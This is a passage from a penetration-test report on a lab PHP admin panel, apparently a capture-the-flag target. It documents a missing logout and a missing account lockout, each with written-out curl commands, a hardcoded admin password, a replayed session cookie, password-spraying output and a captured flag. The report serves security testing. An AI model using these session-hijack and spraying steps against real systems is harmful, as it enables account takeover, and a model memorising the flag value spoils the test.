- **Overview:** No logout functionality exists in the application. Users cannot actively terminate their sessions. Sessions persist until browser closes (unreliable) or PHP garbage collection runs (up to 24 minutes). On shared computers, the next user inherits the authenticated session.
- **Impact:** Session hijacking on shared/public computers, inability to revoke compromised sessions
- **Severity:** HIGH

**Prerequisites:**
- Access to a computer where a user has previously authenticated
- User closed browser tab but session remains valid

**Exploitation Steps:**

1. Victim authenticates on shared computer:
   ```bash
   # Simulating victim authentication
   curl -i -X POST http://localhost:39001/admin.php \
     -d "username=admin&password=ONEverySecurePassword123!"
   ```
   Response includes: `Set-Cookie: PHPSESSID=c9b17be15ae4b65190f5c71878659853`

2. Victim closes browser tab (believes they've logged out, but no logout mechanism exists)

3. Attacker uses same computer and hijacks the persisted session:
   ```bash
   curl -s -H "Cookie: PHPSESSID=c9b17be15ae4b65190f5c71878659853" \
     http://localhost:39001/admin.php
   ```

**Proof of Impact:**
```
=== Step 1: User authenticates on shared computer ===
Session ID created: c9b17be15ae4b65190f5c71878659853
FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}

=== Step 2: User closes browser (thinks they've logged out) ===
No logout mechanism exists - session remains valid

=== Step 3: Attacker uses same computer and hijacks session ===
FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}

=== EXPLOITATION SUCCESSFUL ===
```

Attacker successfully accessed the admin panel using the persisted session ID, retrieving the flag without authentication. The session remained valid for the entire 24-minute garbage collection window.

**Notes:**
No `logout.php` file exists in the application. No `session_destroy()` or `session_unset()` calls appear anywhere in the codebase. Sessions persist until PHP's probabilistic garbage collection removes them (1440 seconds idle timeout). Attack timeline: T+0:00 user authenticates, T+0:05 user closes tab, T+0:10 attacker hijacks session.

---

### AUTH-VULN-10: Unlimited Password Guessing via Missing Account Lockout

**Summary:**
- **Vulnerable location:** POST /admin.php - Authentication handler (lines 11-31), Database schema /app/db_init.sql (missing lockout columns)
- **Overview:** No account lockout mechanism exists after failed authentication attempts. Unlimited login attempts can be made with different passwords without triggering any account suspension or throttling. Enables password spraying attacks.
- **Impact:** Unrestricted password guessing and password spraying attacks
- **Severity:** HIGH

**Prerequisites:**
- None (publicly accessible endpoint)

**Exploitation Steps:**

1. Execute password spraying attack with common passwords:
   ```bash
   python3 password_spray_test.py
   ```

**Proof of Impact:**
```
======================================================================
PASSWORD SPRAYING TEST - Demonstrating Lack of Account Lockout
======================================================================

Target: http://localhost:39001/admin.php
Username: admin
Total passwords to test: 10
Delay between attempts: 1.5s

[Attempt 1] Testing password: 'password'         ✗ Login failed (no lockout)
[Attempt 2] Testing password: '123456'           ✗ Login failed (no lockout)
[Attempt 3] Testing password: 'admin123'         ✗ Login failed (no lockout)
[Attempt 4] Testing password: 'Password1!'       ✗ Login failed (no lockout)
[Attempt 5] Testing password: 'Welcome123!'      ✗ Login failed (no lockout)
[Attempt 6] Testing password: 'Admin@123'        ✗ Login failed (no lockout)
[Attempt 7] Testing password: 'letmein'          ✗ Login failed (no lockout)
[Attempt 8] Testing password: 'qwerty'           ✗ Login failed (no lockout)
[Attempt 9] Testing password: 'ONEverySecurePassword123!' ✓ SUCCESS

======================================================================
RESULTS SUMMARY
======================================================================
Total attempts: 9
Failed attempts: 8
Successful attempts: 1
Account lockout detected: NO ✓

🎯 FLAG RETRIEVED: FLAG{476c383c9464c333394d551fcd5fd72c32d33e4fba66e075015ebbd0879bcc5f}

✓ VULNERABILITY CONFIRMED: No Account Lockout Mechanism
  - Made 8 consecutive failed login attempts
  - No lockout was triggered after multiple failures
  - Account remained accessible for additional attempts
  - Successfully logged in on attempt #9 after 8 failures
```

Successfully tested 8 wrong passwords without triggering any account lockout. The 9th attempt with the correct password succeeded and retrieved the flag. The account remained fully accessible throughout all failed attempts.

**Notes:**
Database schema lacks failed attempt tracking: missing `failed_login_attempts`, `lockout_until`, and `last_failed_login` columns in `admins` table. No application logic exists for account lockout. Complements the rate limiting absence (AUTH-VULN-09). Generic error message prevents username enumeration but doesn't prevent unlimited password guessing.
